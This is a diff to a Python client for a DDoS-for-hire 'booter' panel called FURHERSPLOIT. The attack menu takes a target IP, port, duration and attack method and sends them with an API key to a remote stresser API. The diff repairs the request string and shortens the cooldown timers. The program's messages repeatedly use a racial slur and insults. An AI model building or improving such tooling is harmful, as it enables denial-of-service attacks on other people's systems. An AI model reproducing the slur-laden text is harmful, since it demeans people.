@@ -22,7 +22,7 @@ def really_nigga():
     while True:
         try:
             print("really nigga again with the bullshit...")
-            time.sleep(300)
+            time.sleep(9)
             menu()
         except KeyboardInterrupt:
              time_out()
@@ -31,12 +31,12 @@ def time_out():
     while True:
         try:
             print("okay nigga timeout for you now lol...goodluck")
-            time.sleep(300)
+            time.sleep(9)
             os.system("clear")
-            print("your timeour is over dumbass")
+            print("your timeout is over dumbass")
             menu()
         except KeyboardInterrupt:
-           really_nigga()
+             really_nigga()
 
 def attack_menu():
        ip = str(input("IP: "))
@@ -47,24 +47,24 @@ def attack_menu():
        x = requests.get(methods_from_api)
        print(x.text)
        method = input("METHOD: ")
-       h = requests.get(api+"?key="key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
+       h = requests.get(api+"?key="+key+"&&ip="+ip+"&&port="+port+"&&time="+attk_time+"&&method="+method)
        print(f"{h}")
        print(f"ATTACK SENT TO: {ip} ON PORT {port} FOR {attk_time} WITH METHOD {method}")
-       time.sleep(3)
        print("TIME FOR COOLDOWN BRO SHEESH\(o_o')/")
+       time.sleep(2)
        os.system("clear")
        print(banner)
-       print(f"COOL DOWN TIME LEFT: {max_time}")
+       print(f"COOL DOWN TIME LEFT: 10s")
        print("FURHERSPLOIT PANEL WILL RESUME AFTER COOL DOWN TIME")
        try:
            for _ in range(1):
                while True:
-                   time.sleep(300)
+                   time.sleep(7)
        except KeyboardInterrupt:
-           print("NOTTY ACTIONS DETECTED YOUR GETTING PUT IN TIME OUT FOR 300s AGAIN YOU FUCKING BOZO")
+           print("NOTTY ACTIONS DETECTED YOUR GETTING PUT IN TIME OUT FOR 10s AGAIN YOU FUCKING BOZO")
            for _ in range(1):
                try:
-                   time.sleep(300)
+                   time.sleep(9)
                except KeyboardInterrupt:
                    time_out()
 def menu():
